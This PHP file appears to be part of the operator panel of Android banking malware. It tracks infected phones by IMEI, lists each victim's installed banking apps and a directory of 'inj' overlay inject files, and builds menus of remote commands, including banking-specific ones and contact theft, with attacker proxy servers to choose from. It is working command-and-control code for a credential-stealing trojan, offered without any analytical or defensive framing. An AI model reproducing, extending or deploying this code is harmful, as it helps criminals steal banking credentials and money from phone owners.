
<?php session_start();
include '../../db.php';
include '../../crypt.php';
if (!(isset($_SESSION['user_id']))){
	header("Location: ../index.php");  
	return;
}  
?>

<?php
#$_POST["add_commands"] = "Commands";
$html_form1 = '';
$html_option_list = "<option value='null'></option>";
$html_apps = '<option value="null"></option>';
$html_proxy = '<option value="null"></option>';
$apps_ar = array();
$apps_imei_ar = array();

if(isset($_POST["add_commands"])){
	$imeis = $mysqli->real_escape_string($_POST["checks"]);
	if (preg_match("/checks/",print_r($_POST,true))){
		$html_form1 .= "<input type='text' value='$imeis' name='text_imei' id='text_imei' style='display:none;'/>";
	}

	# get inject list
	//$inj_list = "";
	$files = scandir('../../inj');
	foreach ($files as $file) {
		if (($file != ".") and ($file != "..") and ($file != "") and ($file != "go.php") and ($file != ".htaccess")){
			//$inj_list .= "$file\n";
			array_push($apps_ar, $file);
		}
	}

	# create applist for provided imeis
	$imei_ar = explode(":", $imeis);
	foreach ($imei_ar as $imei) {
		if ($imei != ""){
			# $file_data = file_get_contents("../../logs/apps/".$imei.".log");
			$get_apps_sql = "SELECT * FROM `kliets` WHERE `imei` = '$imei'";
			$get_apps_sql_res = $mysqli->query($get_apps_sql);
			$client = mysqli_fetch_assoc($get_apps_sql_res);
			$applications = explode("\n", $client["bank"]);
			foreach ($applications as $application) {
				array_push($apps_imei_ar, $application);
			}
		}
	}
	$apps_imei_ar = array_unique($apps_imei_ar);
	$apps_ar = array_unique($apps_ar);
	# add options with imeis
	foreach ($apps_imei_ar as $app) {
		if ($app != '')
			$html_apps .= '<option value="'.$app.'">'.$app.'</option>';
	}
	$html_apps .= '<option value="null"> ------------- </option>';

	foreach ($apps_ar as $app) {
		if ($app != '')
			$html_apps .= '<option value="'.$app.'">'.$app.'</option>';
	}

	# generate proxy server list
	$get_prx_srv_sql = "SELECT `id`,`ip` FROM `proxy_servers` WHERE `status` = 1";
	$get_prx_srv_sql_res = $mysqli->query($get_prx_srv_sql);
	while($srv = mysqli_fetch_assoc($get_prx_srv_sql_res)){
		$prx_ip = $srv["ip"];
		$prx_id = $srv["id"];
		$html_proxy .= '<option value="'.$prx_id.'">'.$prx_ip.'</option>';
	}
}
if ($_POST["add_commands"] == "Commands"){
	$commands_sql = "SELECT * FROM `com_config` WHERE `priority` < 9";
	$commands_sql_res = $mysqli->query($commands_sql);
	while ($command = mysqli_fetch_assoc($commands_sql_res)) {
		# exclude some commands...
		if (($command["name"] == "getContacts") or ($command["name"] == "startPermis")) continue;
		$value = $command["name"];
		$text = $command["text"];
		$html_option_list .= "<option value='$value'>$text</option>";
	}
}
if ($_POST["add_commands"] == "Banks"){
	$commands_sql = "SELECT * FROM `com_config` WHERE `priority` > 8";
	$commands_sql_res = $mysqli->query($commands_sql);
	while ($command = mysqli_fetch_assoc($commands_sql_res)) {
		$value = $command["name"];
		$text = $command["text"];
		$html_option_list .= "<option value='$value'>$text</option>";
	}
}
#   %%PLACE_FORM1_HERE%%

$html = file_get_contents("../templates/modal_commands.tpl");
$html = str_replace('%%PLACE_FORM1_HERE%%', $html_form1, $html);
$html = str_replace('%%PLACE_OPTIONS_HERE%%', $html_option_list, $html);
$html = str_replace('%%PLACE_APPLICATIONS_HERE%%', $html_apps, $html);
$html = str_replace('%%PLACE_PROXY_LIST_HERE%%', $html_proxy, $html);

echo $html;

?>